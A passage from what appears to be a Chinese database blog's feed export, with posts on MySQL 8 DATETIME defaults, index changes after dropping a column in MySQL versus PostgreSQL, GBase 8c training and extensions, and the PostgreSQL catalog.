<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(root@localhost) [yandb]&gt; select * from myuser;</span><br><span class="line">+-----------------+------------+---------------------+</span><br><span class="line">| user            | total_conn | update_at           |</span><br><span class="line">+-----------------+------------+---------------------+</span><br><span class="line">| event_scheduler |          1 | 2023-05-21 14:49:30 |</span><br><span class="line">| root            |          7 | 2023-05-21 14:54:57 |</span><br><span class="line">| shawnyan        |          1 | 2023-05-21 14:36:57 |</span><br><span class="line">+-----------------+------------+---------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">(root@localhost) [yandb]&gt; \r</span><br><span class="line">Connection id:    17</span><br><span class="line">Current database: yandb</span><br><span class="line"></span><br><span class="line">(root@localhost) [yandb]&gt; insert myuser(user,total_conn) </span><br><span class="line">    -&gt; select USER,TOTAL_CONNECTIONS </span><br><span class="line">    -&gt; from performance_schema.users AS new </span><br><span class="line">    -&gt; where new.user is not null</span><br><span class="line">    -&gt; ON DUPLICATE KEY UPDATE total_conn = new.TOTAL_CONNECTIONS;</span><br><span class="line">Query OK, 2 rows affected (0.00 sec)</span><br><span class="line">Records: 2  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">(root@localhost) [yandb]&gt; select * from myuser;</span><br><span class="line">+-----------------+------------+---------------------+</span><br><span class="line">| user            | total_conn | update_at           |</span><br><span class="line">+-----------------+------------+---------------------+</span><br><span class="line">| event_scheduler |          1 | 2023-05-21 14:49:30 |</span><br><span class="line">| root            |          8 | 2023-05-21 14:55:12 |</span><br><span class="line">| shawnyan        |          1 | 2023-05-21 14:36:57 |</span><br><span class="line">+-----------------+------------+---------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="小结">小结</h2>
<p>MySQL 8 的各项特性一直在改进优化，在使用新版本或者升级时，也需要注意一下废弃的特性，及时更新应用程式。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                ><hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a class="link"   href="https://dev.mysql.com/doc/refman/8.0/en/performance-schema-users-table.html" >https://dev.mysql.com/doc/refman/8.0/en/performance-schema-users-table.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn2" class="footnote-item"><p><a class="link"   href="https://dev.mysql.com/doc/refman/8.0/en/miscellaneous-functions.html#function_values" >https://dev.mysql.com/doc/refman/8.0/en/miscellaneous-functions.html#function_values <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>MySQL 8.0</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>mysql 8.0</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 管理运维：妙用 DATETIME 数据类型的默认值</title>
    <url>/2023/mysql/mysql-8-case-datetime-default/</url>
    <content><![CDATA[<p>MySQL 中的日期 <code>DATE</code> 和时间 <code>TIME</code> 类型在数据库设计和数据处理中扮演着至关重要的角色。<br>
日期和时间数据类型允许我们存储日期、时间或日期时间值，为数据查询、排序和计算提供了便利。<br>
在 MySQL 中，有多种日期和时间类型，如：<code>DATE</code>, <code>TIME</code>, <code>DATETIME</code>, <code>TIMESTAMP</code> 和 <code>YEAR</code>。</p>
<p>本文将以 <code>DATETIME</code> 数据类型为线索，介绍几种常用的时间类型的默认值用法，并介绍一则案例。</p>
<h2 id="1-默认值为-0-或-NULL">1. 默认值为 0 或 NULL</h2>
<p>DATETIME 设置为 0 表示无效时间格式，默认情况下 MySQL 并不允许这种情况，如果这样设定会报错。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(root@localhost) [yandb]&gt; create table t (</span><br><span class="line">    -&gt; a int, </span><br><span class="line">    -&gt; d1 datetime, </span><br><span class="line">    -&gt; d2 datetime default 0,</span><br><span class="line">    -&gt; d3 datetime default null</span><br><span class="line">    -&gt; );</span><br><span class="line">ERROR 1067 (42000): Invalid default value for &#x27;d2&#x27;</span><br><span class="line">Error (Code 1292): Incorrect datetime value: &#x27;0&#x27; for column &#x27;d2&#x27; at row 1</span><br><span class="line">Error (Code 1067): Invalid default value for &#x27;d2&#x27;</span><br></pre></td></tr></table></figure></div>
<p>这是因为 sql_mode 中设定了 NO_ZERO_DATE 模式，这里为了测试，先临时取消这个设定。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(root@localhost) [yandb]&gt; select @@sql_mode;</span><br><span class="line">+-----------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| @@sql_mode                                                                                                            |</span><br><span class="line">+-----------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION |</span><br><span class="line">+-----------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">(root@localhost) [yandb]&gt; set sql_mode = &#x27;&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<p>创建测试表，包含了三个日期时间类型的列：d1、d2 和 d3。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table t (</span><br><span class="line">a int, </span><br><span class="line">d1 datetime, -- 等价于默认值为 NULL</span><br><span class="line">d2 datetime default 0, -- 等价于默认值为 &#x27;0000-00-00 00:00:00&#x27;</span><br><span class="line">d3 datetime default null</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>
<p>插入测试数据并查看：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(root@localhost) [yandb]&gt; insert t (a) select 1;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Records: 1  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">(root@localhost) [yandb]&gt; table t;</span><br><span class="line">+------+------+---------------------+------+</span><br><span class="line">| a    | d1   | d2                  | d3   |</span><br><span class="line">+------+------+---------------------+------+</span><br><span class="line">|    1 | NULL | 0000-00-00 00:00:00 | NULL |</span><br><span class="line">+------+------+---------------------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="2-默认值为当前时间">2. 默认值为当前时间</h2>
<p>有两种常用的内置方法来获取当前时间，NOW() 和 CURRENT_TIMESTAMP，两者为同义词。</p>
<p>创建测试表：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table t (</span><br><span class="line">a int,</span><br><span class="line">d1 datetime default now(),</span><br><span class="line">d2 datetime default CURRENT_TIMESTAMP</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(root@localhost) [yandb]&gt; show create table t\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">       Table: t</span><br><span class="line">Create Table: CREATE TABLE `t` (</span><br><span class="line">  `a` int DEFAULT NULL,</span><br><span class="line">  `d1` datetime DEFAULT CURRENT_TIMESTAMP,</span><br><span class="line">  `d2` datetime DEFAULT CURRENT_TIMESTAMP</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="3-默认值为当前时间，加上间隔时间">3. 默认值为当前时间，加上间隔时间</h2>
<p>某些使用场景需要获得当前时间，并加上一个日期间隔，比如物品过保日期。</p>
<p>设定默认值的方法为：<code>DEFAULT (CURRENT_DATE + INTERVAL 3 MONTH)</code></p>
<p>测试：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table t (</span><br><span class="line">a int,</span><br><span class="line">d1 datetime default now(),</span><br><span class="line">d2 datetime DEFAULT (CURRENT_TIMESTAMP + INTERVAL 3 MONTH)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">insert t (a) select 1;</span><br></pre></td></tr></table></figure></div>
<p>输出：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(root@localhost) [yandb]&gt; show create table t\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">       Table: t</span><br><span class="line">Create Table: CREATE TABLE `t` (</span><br><span class="line">  `a` int DEFAULT NULL,</span><br><span class="line">  `d1` datetime DEFAULT CURRENT_TIMESTAMP,</span><br><span class="line">  `d2` datetime DEFAULT ((now() + interval 3 month))</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">(root@localhost) [yandb]&gt; table t;</span><br><span class="line">+------+---------------------+---------------------+</span><br><span class="line">| a    | d1                  | d2                  |</span><br><span class="line">+------+---------------------+---------------------+</span><br><span class="line">|    1 | 2023-05-08 11:05:43 | 2023-08-08 11:05:43 |</span><br><span class="line">+------+---------------------+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="4-默认值为当前时间，并自动更新">4. 默认值为当前时间，并自动更新</h2>
<p>时间类型默认值后可以加上 <code>ON UPDATE CURRENT_TIMESTAMP</code> 子句，当有新数据更新时，可自动更新字段为当前时间戳。</p>
<p>这种机制对于跟踪记录的创建时间和最后修改时间非常有用。您不需要在插入或更新记录时手动设置这些时间戳，MySQL 会自动为你处理。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table t (</span><br><span class="line">a int primary key,</span><br><span class="line">d datetime DEFAULT now() ON UPDATE CURRENT_TIMESTAMP</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">replace t(a) select 1;</span><br></pre></td></tr></table></figure></div>
<p>输出：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(root@localhost) [yandb]&gt; show create table t\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">       Table: t</span><br><span class="line">Create Table: CREATE TABLE `t` (</span><br><span class="line">  `a` int NOT NULL,</span><br><span class="line">  `d` datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,</span><br><span class="line">  PRIMARY KEY (`a`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">(root@localhost) [yandb]&gt; table t;</span><br><span class="line">+---+---------------------+</span><br><span class="line">| a | d                   |</span><br><span class="line">+---+---------------------+</span><br><span class="line">| 1 | 2023-05-08 13:34:03 |</span><br><span class="line">+---+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">(root@localhost) [yandb]&gt; replace t(a) select 1;</span><br><span class="line">Query OK, 2 rows affected (0.01 sec)</span><br><span class="line">Records: 1  Duplicates: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">(root@localhost) [yandb]&gt; table t;</span><br><span class="line">+---+---------------------+</span><br><span class="line">| a | d                   |</span><br><span class="line">+---+---------------------+</span><br><span class="line">| 1 | 2023-05-08 13:34:45 |</span><br><span class="line">+---+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="5-案例">5. 案例</h2>
<p>假设我们有一个名为 orders 的表，该表记录了用户的订单信息。表中包含以下字段：order_id（订单ID）、user_id（用户ID）、product_id（产品ID）、quantity（数量）和 order_date（订单日期）。</p>
<p>为了记录订单最后更新时间，可以在该表中增加 update_at 字段，设定默认值为当前时间戳，并开启自动更新。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table orders (</span><br><span class="line">order_id int primary key,</span><br><span class="line">user_id int,</span><br><span class="line">product_id int,</span><br><span class="line">quantity int,</span><br><span class="line">order_date datetime,</span><br><span class="line">update_at datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>
<p>输出：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(root@localhost) [yandb]&gt; insert orders (order_id,user_id,product_id,quantity,order_date) values (1,1,1,1,curdate());</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">(root@localhost) [yandb]&gt; table orders;</span><br><span class="line">+----------+---------+------------+----------+---------------------+---------------------+</span><br><span class="line">| order_id | user_id | product_id | quantity | order_date          | update_at           |</span><br><span class="line">+----------+---------+------------+----------+---------------------+---------------------+</span><br><span class="line">|        1 |       1 |          1 |        1 | 2023-05-08 00:00:00 | 2023-05-08 13:50:33 |</span><br><span class="line">+----------+---------+------------+----------+---------------------+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">(root@localhost) [yandb]&gt; replace orders (order_id,user_id,product_id,quantity,order_date) values (1,1,1,2,curdate());</span><br><span class="line">Query OK, 2 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">(root@localhost) [yandb]&gt; table orders;</span><br><span class="line">+----------+---------+------------+----------+---------------------+---------------------+</span><br><span class="line">| order_id | user_id | product_id | quantity | order_date          | update_at           |</span><br><span class="line">+----------+---------+------------+----------+---------------------+---------------------+</span><br><span class="line">|        1 |       1 |          1 |        2 | 2023-05-08 00:00:00 | 2023-05-08 13:51:18 |</span><br><span class="line">+----------+---------+------------+----------+---------------------+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="小结">小结</h2>
<p>上述 <code>DATETIME</code> 数据类型的默认值各有用途和适用场景。<br>
了解这些默认值和如何设置它们对于正确设计数据库和数据模型至关重要。<br>
最后也给出一个实用案例，巧用默认值设定也可以简化数据处理过程。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >]]></content>
      <categories>
        <category>MySQL</category>
        <category>MySQL 8.0</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>mysql 8.0</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 管理运维：删除列导致索引变化</title>
    <url>/2023/mysql/mysql-8-case-drop-column/</url>
    <content><![CDATA[<p>在 MySQL 数据库中，表的结构和性能优化是数据库管理员和开发人员需要经常考虑的问题。当我们在表中删除某一列时，可能会对该表上的索引产生影响，进而影响到数据库的性能。下面，我将详细介绍一个关于 MySQL 中删除列导致索引变化的案例。</p>
<p>准备 MySQL 8 实验环境：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(root@localhost) [yandb]&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 8.0.33    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure></div>
<p>假设我们有一个名为 orders 的表，该表记录了用户的订单信息。表中包含以下字段：order_id（订单ID）、user_id（用户ID）、product_id（产品ID）、quantity（数量）和 order_date（订单日期）。</p>
<p>为了提高查询性能，我们在 user_id 字段上创建了索引，并在 (product_id, quantity) 两个字段上创建了联合索引。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table orders (</span><br><span class="line">order_id int primary key,</span><br><span class="line">user_id int,</span><br><span class="line">product_id int,</span><br><span class="line">quantity int,</span><br><span class="line">order_date datetime,</span><br><span class="line">key (user_id),</span><br><span class="line">key (product_id, quantity)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>
<p>随着业务的发展，我们发现 quantity 字段不再需要，决定将其从表中删除。</p>
<p>但随着字段的删除，可能导致索引发生变化，进而影响到其他查询，甚至影响性能。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table orders drop column quantity;</span><br></pre></td></tr></table></figure></div>
<p>查看表结构：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">show create table orders\G</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(root@localhost) [yandb]&gt; show create table orders \G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">       Table: orders</span><br><span class="line">Create Table: CREATE TABLE `orders` (</span><br><span class="line">  `order_id` int NOT NULL,</span><br><span class="line">  `user_id` int DEFAULT NULL,</span><br><span class="line">  `product_id` int DEFAULT NULL,</span><br><span class="line">  `order_date` datetime DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`order_id`),</span><br><span class="line">  KEY `user_id` (`user_id`),</span><br><span class="line">  KEY `product_id` (`product_id`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure></div>
<p>发现删除列之后，复合索引会变成普通索引。</p>
<p>但是，相同案例，在 PostgreSQL 数据库中，则有不同表现。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">postgres=# select version();</span><br><span class="line">                                                 version                                                 </span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line"> PostgreSQL 15.2 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-44), 64-bit</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure></div>
<p>创建测试表：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table orders (</span><br><span class="line">order_id int primary key,</span><br><span class="line">user_id int,</span><br><span class="line">product_id int,</span><br><span class="line">quantity int,</span><br><span class="line">order_date date</span><br><span class="line">);</span><br><span class="line">create index idx1 on orders(user_id);</span><br><span class="line">create index idx2 on orders(product_id, quantity);</span><br></pre></td></tr></table></figure></div>
<p>查看表结构：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">postgres=# \d orders</span><br><span class="line">                 Table &quot;public.orders&quot;</span><br><span class="line">   Column   |  Type   | Collation | Nullable | Default </span><br><span class="line">------------+---------+-----------+----------+---------</span><br><span class="line"> order_id   | integer |           | not null | </span><br><span class="line"> user_id    | integer |           |          | </span><br><span class="line"> product_id | integer |           |          | </span><br><span class="line"> quantity   | integer |           |          | </span><br><span class="line"> order_date | date    |           |          | </span><br><span class="line">Indexes:</span><br><span class="line">    &quot;orders_pkey&quot; PRIMARY KEY, btree (order_id)</span><br><span class="line">    &quot;idx1&quot; btree (user_id)</span><br><span class="line">    &quot;idx2&quot; btree (product_id, quantity)</span><br></pre></td></tr></table></figure></div>
<p>删除 quantity 字段：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">postgres=# alter table orders drop column quantity;</span><br><span class="line">ALTER TABLE</span><br><span class="line">postgres=# \d orders</span><br><span class="line">                 Table &quot;public.orders&quot;</span><br><span class="line">   Column   |  Type   | Collation | Nullable | Default </span><br><span class="line">------------+---------+-----------+----------+---------</span><br><span class="line"> order_id   | integer |           | not null | </span><br><span class="line"> user_id    | integer |           |          | </span><br><span class="line"> product_id | integer |           |          | </span><br><span class="line"> order_date | date    |           |          | </span><br><span class="line">Indexes:</span><br><span class="line">    &quot;orders_pkey&quot; PRIMARY KEY, btree (order_id)</span><br><span class="line">    &quot;idx1&quot; btree (user_id)</span><br><span class="line"></span><br><span class="line">postgres=# </span><br></pre></td></tr></table></figure></div>
<p>发现 <code>&quot;idx2&quot; btree (product_id, quantity)</code> 索引被一并删除。</p>
<p>总结，删除字段操作需要仔细评估，在不同数据库中表现可能不一致，下面提示三点注意事项：</p>
<ol>
<li>测试验证：在对生产环境做变更之前，一定要在测试环境进行测试验证，以得到符合预期的结果。</li>
<li>备份数据：在进行任何结构修改之前，务必备份数据库。这样，如果出现问题，我们可以快速恢复到原始状态。</li>
<li>监控性能：删除列或索引后，密切监控数据库的性能。观察查询响应时间、资源利用率等指标，确保系统稳定运行。</li>
</ol>
<p>– END –</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >]]></content>
      <categories>
        <category>MySQL</category>
        <category>MySQL 8.0</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>mysql 8.0</tag>
      </tags>
  </entry>
  <entry>
    <title>再遇 GBase 如沐春风</title>
    <url>/2023/gbase/gbase-8c-my-story/</url>
    <content><![CDATA[<img  alt="bannerxt.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240223-5cbd03e9-2986-413d-bdf7-42c4ca510016.jpg"
                      referrerpolicy="no-referrer"
                >
<p><strong><center>与 GBase 8c 的再次相遇<br>
—— 记录“我和南大通用 GBase 数据库”的故事</center></strong></p>
<p>时隔一年多，再次与南大通用 GBase 数据库培训相遇，不过这次的上课体验完全不同，因为这是 GBase 8c 首次公开培训课程，也是近 500 人在线学习的大课堂。</p>
<p>GBase 8c 认证培训从 3 月 14 日开始接受报名当天，我就在看到 @沈老师 推送的文章 <a class="link"   href="https://www.modb.pro/db/618667" >GBase 8c 多模多态分布式数据库首期认证培训开班啦，欢迎报名~ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 后，第一时间报名参训。做为 GBase 8a 和 GBase 8s 两届 GDCA 培训老学员的我，再次感受到了熟悉的配方熟悉的味道，从 3 月 20 日，到 4 月 1 日，每天解锁一节课，让学员们可以有节奏的学习，不会一蹴而就把所有课程一下子全学完，从而出现学习不扎实的情况，也不会进度拖沓不前，因为每天课程内容都经过筹划且反复试讲，课后也配有练习题，更何况 @小尼老师 也会每天在 GBase 8c 学习群里提醒并督促大家学习。这次课程与之前有所不同的是，不是从零基础开始教学，而是希望学员有一定的数据库基础，尤其是 PostgreSQL 或者 openGauss 数据库，这样更利于对课程的整体把握，可以快速上手对 GBase 8c 分布式数据库的实际使用。</p>
<p>最近一段时间压力较大，没有太多空闲时间好好研究 GBase 8c，勉强算是把课程听完，课后练习题做了几遍。当然，“边学边练”的学习方式不能少，练习题里有搞不明白的概念就回头多翻几次 PPT。比如 GBase 8c 数据库提供了行存、列存和内存三种存储模式，不同存储方式分别适用于什么业务场景。再如，行存表和列存表都支持压缩，那么行存表和列存表分别使用哪个关键字进行压缩存储。</p>
<p>在学习 GBase 8c 课程的同时，我还输出了两篇实战文章：一篇是 <a href="https://shawnyan.cn/2023/gbase/gbase-8c-install/">《快速搭建 GBase 8c 集群环境》</a> ，文章标题即内容，做为自己搭建 GBase 8c 集群的总结和原厂老师提供的搭建步骤的补充参考。另一篇是 <a href="https://shawnyan.cn/2023/gbase/gbase-8c-cmd-problem/">《GBase 8c 分布式数据库 常用命令 &amp; 常见问题 集锦》</a> ，总结了一些 GBase 8c 的常用命令，以及我自己遇到和在学习群里看到的若干问题，感谢 @小尼老师 和 @GBase-齐老师 对技术问题的解答。也很感谢 @沈老师 推荐本次培训课程，以及我在学习过程中遇到疑问时的悉心解答。</p>
<p>GBase 8c 是南大通用面对新业态、新挑战所适时推出的新一代数据库，是业内首个基于 openGauss 3.0 发布的多模多态的分布式数据库。南大通用已深耕各行业数据领域多年，相信 GBase 8c 的正式商用必然会给企业客户提供更加高质量、高效能、高价值的数据服务。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-my-story/2023-04-09-01.png"
                      alt="" loading="lazy"
                ></p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/622578" >https://www.modb.pro/db/622578 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://mp.weixin.qq.com/s?__biz=MzI2ODU2NDUzMQ==&amp;mid=2247493448&amp;idx=5&amp;sn=97c4d97e4f3eefb31a17ee9fab7fbf39" >https://mp.weixin.qq.com/s?__biz=MzI2ODU2NDUzMQ==&amp;mid=2247493448&amp;idx=5&amp;sn=97c4d97e4f3eefb31a17ee9fab7fbf39 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>GBase</category>
        <category>GBase 8c</category>
      </categories>
      <tags>
        <tag>gbase</tag>
        <tag>gdca</tag>
        <tag>南大通用</tag>
        <tag>gbase 8c</tag>
        <tag>国产数据库认证</tag>
      </tags>
  </entry>
  <entry>
    <title>PG 中的 Catalog</title>
    <url>/2023/postgresql/pg-catalog/</url>
    <content><![CDATA[<p>PG不愧是学院派，名词使用是遵从sql标准的，在sql92标准中，有这样一段描述：</p>
<blockquote>
<p>Catalogs are named collections of schemas in an SQL-environment.<br>
A cluster is an implementation-defined collection of catalogs.</p>
</blockquote>
<p>在官档<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>中也有相关表述</p>
<img  alt="pg-catalog.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230331-a770c8d5-cb91-431f-b703-6d4f52a25d51.png"
                      referrerpolicy="no-referrer"
                >
<p>终于知道 catalog 是怎么来的了。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">postgres<span class="operator">=</span># <span class="keyword">select</span> current_schemas(<span class="literal">True</span>);</span><br><span class="line">   current_schemas   </span><br><span class="line"><span class="comment">---------------------</span></span><br><span class="line"> &#123;pg_catalog,public&#125;</span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br><span class="line"></span><br><span class="line">postgres<span class="operator">=</span># <span class="keyword">select</span> <span class="built_in">current_catalog</span>;</span><br><span class="line"> <span class="built_in">current_catalog</span> </span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line"> postgres</span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/621638" >https://www.modb.pro/db/621638 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a class="link"   href="https://www.postgresql.org/docs/15/functions-info.html" >https://www.postgresql.org/docs/15/functions-info.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>PostgreSQL</category>
      </categories>
      <tags>
        <tag>postgresql</tag>
        <tag>sql92</tag>
        <tag>catalog</tag>
        <tag>schema</tag>
      </tags>
  </entry>
  <entry>
    <title>GBase 8c 预装的扩展插件有哪些？</title>
    <url>/2023/gbase/gbase-8c-extensions/</url>
    <content><![CDATA[<img  alt="bannerxt.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240223-5cbd03e9-2986-413d-bdf7-42c4ca510016.jpg"
                      referrerpolicy="no-referrer"
                >
<h2 id="GBase-8c">GBase 8c</h2>
<p>为解决传统的集中式数据库对高并发、高吞吐量的需求支持能力不足，满足金融核心系统对数据库的性能、稳定性和安全性的严苛要求，南大通用集十多年分布式开发经验积累，于2022年全新发布了一款适合OLTP领域应用的多模多态的分布式数据库 GBase 8c。</p>
<p>GBase 8c 是基于 openGauss 3.0.0 构建的一款多模多态的分布式数据库，支持行存、列存、内存等多种存储模式和单机、主备与分布式等多种部署形态。GBase 8c 具备高性能、高可用、弹性伸缩、高安全性等特性，支持强一致性的分布式事务，支持主流的RC和RR的事务隔离级别。可以部署在物理机、虚拟机、容器、私有云和公有云，为关键行业核心系统、互联网业务系统和政企业务系统提供安全、稳定、可靠的数据存储和管理服务。</p>
<h2 id="GBase-8c-扩展插件列表">GBase 8c 扩展插件列表</h2>
<p>在 CN 节点连接 GBase 8c 数据库，可以查看到 GBase 8c 共提供了 25 个可用插件，并且默认已安装 10 个。<br>
下面将逐一分析这10个预装扩展。</p>
